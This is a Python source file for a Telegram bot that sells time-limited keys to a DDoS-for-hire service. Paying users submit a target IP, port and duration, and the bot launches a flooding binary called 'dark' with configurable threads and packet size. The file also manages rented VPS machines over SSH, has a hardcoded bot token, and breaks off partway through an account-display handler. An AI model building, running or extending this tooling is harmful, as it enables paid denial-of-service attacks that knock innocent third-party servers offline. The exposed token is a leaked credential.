import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from typing import Dict, List, Optional
import sys
import os
import paramiko
from stat import S_ISDIR

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Constants
KEY_PRICES = {
    'hour': 10,  # 10 Rs per hour
    'day': 80,   # 80 Rs per day
    'week': 300  # 300 Rs per week
}
ADMIN_IDS = [1604629264]  # Replace with actual admin IDs
BOT_TOKEN = "7686606251:AAHyF41nId48dNyRweYGNkHCdriRs0WzRVk"  # Replace with your bot token
thread_count = 900
packet_size = 9
ADMIN_FILE = 'admin_data.json'
VPS_FILE = 'vps_data.json'
OWNER_FILE = 'owner_data.json'
last_attack_times = {}
COOLDOWN_MINUTES = 0
OWNER_IDS = ADMIN_IDS.copy()  # Start with super admins as owners
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# File paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')

# Global variables
keys = {}
redeemed_keys = set()
loop = None

# Helper functions
def check_cooldown(user_id: int) -> tuple[bool, int]:
    """Check if a user is in cooldown period"""
    if user_id not in last_attack_times:
        return False, 0
        
    last_attack = last_attack_times[user_id]
    current_time = datetime.now()
    time_diff = current_time - last_attack
    cooldown_seconds = COOLDOWN_MINUTES * 60
    
    if time_diff.total_seconds() < cooldown_seconds:
        remaining = cooldown_seconds - time_diff.total_seconds()
        return True, int(remaining)
    return False, 0

def update_last_attack_time(user_id: int):
    """Update the last attack time for a user"""
    last_attack_times[user_id] = datetime.now()

def load_admin_data():
    """Load admin data from file"""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                return json.load(f)
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
        return {'admins': {str(admin_id): {'balance': float('inf')} for admin_id in ADMIN_IDS}}
    
def update_admin_balance(admin_id: str, amount: float) -> bool:
    """Update admin's balance after key generation"""
    try:
        admin_data = load_admin_data()
        
        # Super admins have infinite balance
        if int(admin_id) in ADMIN_IDS:
            return True
            
        if str(admin_id) not in admin_data['admins']:
            return False
            
        current_balance = admin_data['admins'][str(admin_id)]['balance']
        
        if current_balance < amount:
            return False
            
        admin_data['admins'][str(admin_id)]['balance'] -= amount
        save_admin_data(admin_data)
        return True
        
    except Exception as e:
        logging.error(f"Error updating admin balance: {e}")
        return False
    
def save_admin_data(data):
    """Save admin data to file"""
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False
    
def is_super_admin(user_id):
    """Check if user is a super admin"""
    return user_id in ADMIN_IDS

def is_owner(user_id):
    """Check if user is an owner"""
    return user_id in OWNER_IDS

def get_admin_balance(user_id):
    """Get admin's balance"""
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def calculate_key_price(amount: int, time_unit: str) -> float:
    """Calculate the price for a key based on duration"""
    base_price = KEY_PRICES.get(time_unit.lower().rstrip('s'), 0)
    return base_price * amount

def ensure_file_exists(filepath):
    """Ensure the file exists and create if it doesn't"""
    if not os.path.exists(filepath):
        with open(filepath, 'w') as f:
            if filepath.endswith('.txt'):
                f.write('[]')  # Initialize with empty array for users.txt
            else:
                f.write('{}')  # Initialize with empty object for other files

def load_users():
    """Load users from users.txt with proper error handling"""
    ensure_file_exists(USERS_FILE)
    try:
        with open(USERS_FILE, 'r') as f:
            content = f.read().strip()
            if not content:  # If file is empty
                return []
            return json.loads(content)
    except json.JSONDecodeError:
        # If file is corrupted, backup and create new
        backup_file = f"{USERS_FILE}.backup"
        if os.path.exists(USERS_FILE):
            os.rename(USERS_FILE, backup_file)
        return []
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return []

def save_users(users):
    """Save users to users.txt with proper error handling"""
    ensure_file_exists(USERS_FILE)
    try:
        # Create temporary file
        temp_file = f"{USERS_FILE}.temp"
        with open(temp_file, 'w') as f:
            json.dump(users, f, indent=2)
        
        # Rename temp file to actual file
        os.replace(temp_file, USERS_FILE)
        return True
    except Exception as e:
        logging.error(f"Error saving users: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return False
    
def get_username_from_id(user_id):
    users = load_users()
    for user in users:
        if user['user_id'] == user_id:
            return user.get('username', 'N/A')
    return "N/A"

def is_admin(user_id):
    """Check if user is either a super admin or regular admin"""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or user_id in ADMIN_IDS

def load_keys():
    """Load keys with proper error handling"""
    ensure_file_exists(KEYS_FILE)
    keys = {}
    try:
        with open(KEYS_FILE, 'r') as f:
            content = f.read().strip()
            if not content:  # If file is empty
                return {}
                
            # Parse each line as a separate JSON object
            for line in content.split('\n'):
                if line.strip():
                    key_data = json.loads(line)
                    # Each line should contain a single key-duration pair
                    for key, duration_str in key_data.items():
                        days, seconds = map(float, duration_str.split(','))
                        keys[key] = timedelta(days=days, seconds=seconds)
            return keys
                    
    except Exception as e:
        logging.error(f"Error loading keys: {e}")
        return {}

def save_keys(keys: Dict[str, timedelta]):
    """Save keys with proper error handling"""
    ensure_file_exists(KEYS_FILE)
    try:
        temp_file = f"{KEYS_FILE}.temp"
        with open(temp_file, 'w') as f:
            # Write each key-duration pair as a separate JSON object on a new line
            for key, duration in keys.items():
                duration_str = f"{duration.days},{duration.seconds}"
                json_line = json.dumps({key: duration_str})
                f.write(f"{json_line}\n")
        
        # Rename temp file to actual file
        os.replace(temp_file, KEYS_FILE)
        return True
        
    except Exception as e:
        logging.error(f"Error saving keys: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return False
    
def check_user_expiry():
    """Periodically check and remove expired users"""
    while True:
        try:
            users = load_users()
            current_time = datetime.now()
            
            # Filter out expired users
            active_users = [
                user for user in users 
                if datetime.fromisoformat(user['valid_until']) > current_time
            ]
            
            # Only save if there are changes
            if len(active_users) != len(users):
                save_users(active_users)
                
        except Exception as e:
            logging.error(f"Error in check_user_expiry: {e}")
        
        time.sleep(300)  # Check every 5 minutes

def generate_key(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def load_vps_data():
    """Load VPS data from file"""
    try:
        if os.path.exists(VPS_FILE):
            with open(VPS_FILE, 'r') as f:
                return json.load(f)
        return {'vps': {}}
    except Exception as e:
        logger.error(f"Error loading VPS data: {e}")
        return {'vps': {}}

def save_vps_data(data):
    """Save VPS data to file"""
    try:
        with open(VPS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving VPS data: {e}")
        return False

def load_owner_data():
    """Load owner data from file"""
    try:
        if os.path.exists(OWNER_FILE):
            with open(OWNER_FILE, 'r') as f:
                data = json.load(f)
                # Update global OWNER_IDS
                global OWNER_IDS
                OWNER_IDS.extend(data.get('owners', []))
                return data
        return {'owners': []}
    except Exception as e:
        logger.error(f"Error loading owner data: {e}")
        return {'owners': []}

def save_owner_data(data):
    """Save owner data to file"""
    try:
        with open(OWNER_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving owner data: {e}")
        return False

def ssh_execute(hostname, username, password, command):
    """Execute a command on remote VPS via SSH"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        
        client.close()
        
        if error:
            return False, error
        return True, output
    except Exception as e:
        return False, str(e)

def ssh_upload_file(hostname, username, password, local_path, remote_path):
    """Upload file to VPS via SFTP"""
    try:
        transport = paramiko.Transport((hostname, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, remote_path)
        
        sftp.close()
        transport.close()
        return True, "File uploaded successfully"
    except Exception as e:
        return False, str(e)

def ssh_remove_file(hostname, username, password, remote_path):
    """Remove file from VPS via SFTP"""
    try:
        transport = paramiko.Transport((hostname, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.remove(remote_path)
        
        sftp.close()
        transport.close()
        return True, "File removed successfully"
    except Exception as e:
        return False, str(e)

def ssh_list_files(hostname, username, password, remote_path="."):
    """List files on VPS via SFTP"""
    try:
        transport = paramiko.Transport((hostname, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        files = []
        
        def listdir(path):
            for entry in sftp.listdir_attr(path):
                mode = entry.st_mode
                if S_ISDIR(mode):
                    listdir(f"{path}/{entry.filename}")
                else:
                    files.append(f"{path}/{entry.filename}")
        
        listdir(remote_path)
        
        sftp.close()
        transport.close()
        return True, files
    except Exception as e:
        return False, str(e)

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"

    # Create keyboard markup
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    my_account_button = KeyboardButton("𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
    attack_button = KeyboardButton("🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
    markup.add(my_account_button, attack_button)

    if is_super_admin(user_id):
        welcome_message = (
            f"Welcome, Super Admin! Developed By ᚛ @LostBoiXD ᚜\n\n"
            f"Admin Commands:\n"
            f"/addadmin - Add new admin\n"
            f"/removeadmin - Remove admin\n"
            f"/genkey - Generate new key\n"
            f"/remove - Remove user\n"
            f"/users - List all users\n"
            f"/thread - Set thread count\n"
            f"/packet - Set packet size\n"
            f"\nOwner Commands:\n"
            f"/addvps - Add new VPS\n"
            f"/listvps - List all VPS\n"
            f"/removevps - Remove VPS\n"
            f"/addowner - Add new owner\n"
            f"/addall - Add file to all VPS\n"
            f"/removeall - Remove file from all VPS\n"
            f"/showfiles - List files on VPS"
        )
    elif is_admin(user_id):
        balance = get_admin_balance(user_id)
        welcome_message = (
            f"Welcome, Admin! Developed By ᚛ @LostBoiXD ᚜\n\n"
            f"Your Balance: {balance}\n\n"
            f"Admin Commands:\n"
            f"/genkey - Generate new key\n"
            f"/remove - Remove user\n"
            f"/balance - Check your balance"
        )
    else:
        welcome_message = (
            f"Welcome, {username}! Developed By ᚛ @LostBoiXD ᚜\n\n"
            f"Please redeem a key to access bot functionalities.\n"
            f"Available Commands:\n"
            f"/redeem - To redeem key\n"
            f"/Attack - Start an attack\n\n"
            f"Contact ᚛ @LostBoiXD ᚜ for new keys"
        )

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['thread'])
def set_thread_count(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change thread settings.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*Please specify the thread count.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_thread_command)

@bot.message_handler(commands=['packet'])
def set_packet_size(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to change packet size settings.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*Please specify the packet size.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_packet_command)

def process_packet_command(message):
    global packet_size
    chat_id = message.chat.id

    try:
        new_packet_size = int(message.text)
        
        if new_packet_size <= 0:
            bot.send_message(chat_id, "*Packet size must be a positive number.*", parse_mode='Markdown')
            return

        packet_size = new_packet_size
        bot.send_message(chat_id, f"*Packet size set to {packet_size} for dark.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid packet size. Please enter a valid number.*", parse_mode='Markdown')

def process_thread_command(message):
    global thread_count
    chat_id = message.chat.id

    try:
        new_thread_count = int(message.text)
        
        if new_thread_count <= 0:
            bot.send_message(chat_id, "*Thread count must be a positive number.*", parse_mode='Markdown')
            return

        thread_count = new_thread_count
        bot.send_message(chat_id, f"*Thread count set to {thread_count} for dark.*", parse_mode='Markdown')

    except ValueError:
        bot.send_message(chat_id, "*Invalid thread count. Please enter a valid number.*", parse_mode='Markdown')

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        # Update last attack time before starting the attack
        update_last_attack_time(user_id)

        # Construct command for dark binary with thread count and packet size
        command = f"./dark {target_ip} {target_port} {duration} {packet_size} {thread_count}"

        # Send initial attack message
        bot.send_message(chat_id, 
            f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n"
            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
            f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
            f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
            f"᚛ ᚛ 𝐏 𝐀 𝐑 𝐀 𝐃 𝐎 𝐗 锋 ᚜ ᚜")

        # Create and run process without output
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        
        # Wait for process to complete
        await process.wait()

        # Send completion message
        bot.send_message(chat_id, 
            f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")

    except Exception as e:
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check cooldown first, regardless of admin status
    in_cooldown, remaining = check_cooldown(user_id)
    if in_cooldown:
        minutes = remaining // 60
        seconds = remaining % 60
        bot.send_message(
            chat_id,
            f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
            parse_mode='Markdown'
        )
        return

    # If user is admin, allow attack
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack command: {e}")
            return

    # For regular users, check if they have a valid key
    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*You are not registered. Please redeem a key.\nContact For New Key:- ᚛ @LostBoiXD ᚜*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        user_id = message.from_user.id
        
        # Double-check cooldown when processing the attack
        in_cooldown, remaining = check_cooldown(user_id)
        if in_cooldown:
            minutes = remaining // 60
            seconds = remaining % 60
            bot.send_message(
                chat_id,
                f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
                parse_mode='Markdown'
            )
            return
            
        args = message.text.split()
        
        if len(args) != 3:
            bot.send_message(chat_id, "*गलत हुआ है। ट्राई अगेन 😼*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Create a new event loop for this thread if necessary
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

        # Run the attack command with user_id
        loop.run_until_complete(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id))
        
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')

@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By ᚛ @LostBoiXD ᚜"  
    bot.send_message(message.chat.id, owner_message)

@bot.message_handler(commands=['addadmin'])
def add_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Only super admins can add new admins
    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to add admins.*", parse_mode='Markdown')
        return

    try:
        # Parse command arguments
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "*Usage: /addadmin <user_id> <balance>*", parse_mode='Markdown')
            return

        new_admin_id = args[1]
        try:
            balance = float(args[2])
            if balance < 0:
                bot.reply_to(message, "*Balance must be a positive number.*", parse_mode='Markdown')
                return
        except ValueError:
            bot.reply_to(message, "*Balance must be a valid number.*", parse_mode='Markdown')
            return

        # Load current admin data
        admin_data = load_admin_data()

        # Add new admin with balance
        admin_data['admins'][new_admin_id] = {
            'balance': balance,
            'added_by': user_id,
            'added_date': datetime.now().isoformat()
        }

        # Save updated admin data
        if save_admin_data(admin_data):
            bot.reply_to(message, f"*Successfully added admin:*\nID: `{new_admin_id}`\nBalance: `{balance}`", parse_mode='Markdown')
            
            # Try to notify the new admin
            try:
                bot.send_message(
                    int(new_admin_id),
                    "*🎉 Congratulations! You have been promoted to admin!*\n"
                    f"Your starting balance is: `{balance}`\n\n"
                    "You now have access to admin commands:\n"
                    "/genkey - Generate new key\n"
                    "/remove - Remove user\n"
                    "/balance - Check your balance",
                    parse_mode='Markdown'
                )
            except:
                logger.warning(f"Could not send notification to new admin {new_admin_id}")
        else:
            bot.reply_to(message, "*Failed to add admin. Please try again.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in add_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while adding admin.*", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.reply_to(message, "*This command is only available for admins.*", parse_mode='Markdown')
        return

    balance = get_admin_balance(user_id)
    if is_super_admin(user_id):
        bot.reply_to(message, "*You are a super admin with unlimited balance.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"*Your current balance: {balance}*", parse_mode='Markdown')

@bot.message_handler(commands=['removeadmin'])
def remove_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_super_admin(user_id):
        bot.reply_to(message, "*You are not authorized to remove admins.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "*Usage: /removeadmin <user_id>*", parse_mode='Markdown')
            return

        admin_to_remove = args[1]
        admin_data = load_admin_data()

        if admin_to_remove in admin_data['admins']:
            del admin_data['admins'][admin_to_remove]
            if save_admin_data(admin_data):
                bot.reply_to(message, f"*Successfully removed admin {admin_to_remove}*", parse_mode='Markdown')
                
                # Try to notify the removed admin
                try:
                    bot.send_message(
                        int(admin_to_remove),
                        "*Your admin privileges have been revoked.*",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            else:
                bot.reply_to(message, "*Failed to remove admin. Please try again.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, "*This user is not an admin.*", parse_mode='Markdown')

    except Exception as e:
        logger.error(f"Error in remove_admin_command: {e}")
        bot.reply_to(message, "*An error occurred while removing admin.*", parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to generate keys.\nContact Owner: ᚛ @LostBoiXD ᚜*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, (
            "*Usage: /genkey <amount> <unit>*\n\n"
            "Available units and prices:\n"
            "- hour/hours (10₹ per hour)\n"
            "- day/days (80₹ per day)\n"
            "- week/weeks (500₹ per week)"
        ), parse_mode='Markdown')
        return
    
    try:
        amount = int(cmd_parts[1])
        time_unit = cmd_parts[2].lower()
        
        # Normalize time unit
        base_unit = time_unit.rstrip('s')  # Remove trailing 's' if present
        if base_unit == 'week':
            duration = timedelta(weeks=amount)
            price_unit = 'week'
        elif base_unit == 'day':
            duration = timedelta(days=amount)
            price_unit = 'day'
        elif base_unit == 'hour':
            duration = timedelta(hours=amount)
            price_unit = 'hour'
        else:
            bot.send_message(chat_id, "*Invalid time unit. Use 'hours', 'days', or 'weeks'.*", parse_mode='Markdown')
            return
        
        # Calculate price
        price = calculate_key_price(amount, price_unit)
        
        # Check and update balance
        if not update_admin_balance(str(user_id), price):
            current_balance = get_admin_balance(user_id)
            bot.send_message(chat_id, 
                f"*Insufficient balance!*\n\n"
                f"Required: {price}₹\n"
                f"Your balance: {current_balance}₹", 
                parse_mode='Markdown')
            return
        
        # Generate and save key
        global keys
        keys = load_keys()
        key = generate_key()
        keys[key] = duration
        save_keys(keys)
        
        # Send success message
        new_balance = get_admin_balance(user_id)
        success_msg = (
            f"*Key generated successfully!*\n\n"
            f"Key: `{key}`\n"
            f"Duration: {amount} {time_unit}\n"
            f"Price: {price}₹\n"
            f"Remaining balance: {new_balance}₹\n\n"
            f"Copy this key and use:\n/redeem {key}"
        )
        
        bot.send_message(chat_id, success_msg, parse_mode='Markdown')
        
        # Log the transaction
        logging.info(f"Admin {user_id} generated key worth {price}₹ for {amount} {time_unit}")
    
    except ValueError:
        bot.send_message(chat_id, "*Invalid amount. Please enter a number.*", parse_mode='Markdown')
        return
    except Exception as e:
        logging.error(f"Error in genkey_command: {e}")
        bot.send_message(chat_id, "*An error occurred while generating the key.*", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = cmd_parts[1]
    
    # Load the current keys
    global keys
    keys = load_keys()
    
    # Check if the key is valid and not already redeemed
    if key in keys and key not in redeemed_keys:
        duration = keys[key]  # This is already a timedelta
        expiration_time = datetime.now() + duration

        users = load_users()
        # Save the user info to users.txt
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            new_user = {
                'user_id': user_id,
                'username': f"@{message.from_user.username}" if message.from_user.username else "Unknown",
                'valid_until': expiration_time.isoformat().replace('T', ' '),
                'current_date': datetime.now().isoformat().replace('T', ' '),
                'plan': 'Plan Premium'
            }
            users.append(new_user)
        else:
            found_user['valid_until'] = expiration_time.isoformat().replace('T', ' ')
            found_user['current_date'] = datetime.now().isoformat().replace('T', ' ')

        # Mark the key as redeemed
        redeemed_keys.add(key)
        # Remove the used key from the keys file
        del keys[key]
        save_keys(keys)
        save_users(users)

        bot.send_message(chat_id, "*Key redeemed successfully!*", parse_mode='Markdown')
    else:
        if key in redeemed_keys:
            bot.send_message(chat_id, "*This key has already been redeemed!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- ᚛ @LostBoiXD ᚜*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(cmd_parts[1])
    users = load_users()
    users = [user for user in users if user['user_id'] != target_user_id]
    save_users(users)

    bot.send_message(chat_id, f"User {target_user_id} has been removed.")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Only super admins can see all users
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to view all users.*", parse_mode='Markdown')
        return

    users = load_users()
    valid_users = [user for user in users if datetime.now() < datetime.fromisoformat(user['valid_until'])]

    if valid_users:
        user_list = "\n".join(f"ID: {user['user_id']} \nUsername: {user.get('username', 'N/A')}" for user in valid_users)
        bot.send_message(chat_id, f"Registered users:\n{user_list}")
    else:
        bot.send_message(chat_id, "No users have valid keys.")

@bot.message_handler(func=lambda message: message.text == "🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
def attack_button_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check cooldown first, regardless of admin status
    in_cooldown, remaining = check_cooldown(user_id)
    if in_cooldown:
        minutes = remaining // 60
        seconds = remaining % 60
        bot.send_message(
            chat_id,
            f"*⏰ Cooldown in progress! Please wait {minutes}m {seconds}s before starting another attack.*",
            parse_mode='Markdown'
        )
        return

    # Rest of the handler remains the same...
    if is_admin(user_id):
        try:
            bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command, chat_id)
            return
        except Exception as e:
            logging.error(f"Error in attack button: {e}")
            return

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "*𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @LostBoiXD ᚜*", parse_mode='Markdown')
        return

    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "*𝐘𝐨𝐮𝐫 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐫𝐞𝐝𝐞𝐞𝐦 𝐀 𝐤𝐞𝐲 𝐓𝐨 𝐎𝐰𝐧𝐞𝐫:- ᚛ @LostBoiXD ᚜.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 ✅:\n<𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack button: {e}")

@bot.message_handler(func=lambda message: message.text == "𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
def my_account(message):
    user_id = message.from_user.id
    users = load_users()

    # Find the user in the list
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if is_super_admin(user_id):
            account_info = (
                "👑---------------𝐀𝐝𝐦𝐢𝐧 𝐃𝐚𝐬𝐡𝐛𝐨𝐚𝐫𝐝---------------👑       \n\n"
                "🌟  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀               \n"
                "ꜱᴛᴀᴛᴜꜱ: Super Admin\n"
                "ᴀᴄᴄᴇꜱꜱ ʟᴇᴠᴇʟ: Unlimited\n"
                "ᴘʀɪᴠɪʟᴇɢᴇꜱ: Full System Control\n\n"
                "💼  𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 \n"
                "• Generate Keys\n"
                "• Manage Admins\n"
                "• System Configuration\n"
                "• Unlimited Balance"
            )
    
    elif is_admin(user_id):
            # For regular admins
            balance = get_admin_balance(user_id)
            account_info = (
                "🛡️---------------𝐀𝐝𝐦𝐢𝐧 𝐏𝐫𝐨𝐟𝐢𝐥𝐞---------------🛡️n\n"
                f"💰  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance}₹\n\n"
                "🌐  𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
                "• ʀᴏʟᴇ: Admin\n"
                "• ᴀᴄᴄᴇꜱꜱ: Restricted\n"
                "• ᴘʀɪᴠɪʟᴇɢᴇꜱ:\n"
                "  - Generate Keys\n"
                "  - User Management\n"
                "  - Balance Tracking"
            )
    elif found_user:
        valid_until = datetime.fromisoformat(found_user.get('valid_until', 'N/A')).strftime('%Y-%m-%d %H:%M:%S')
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            account_info = (
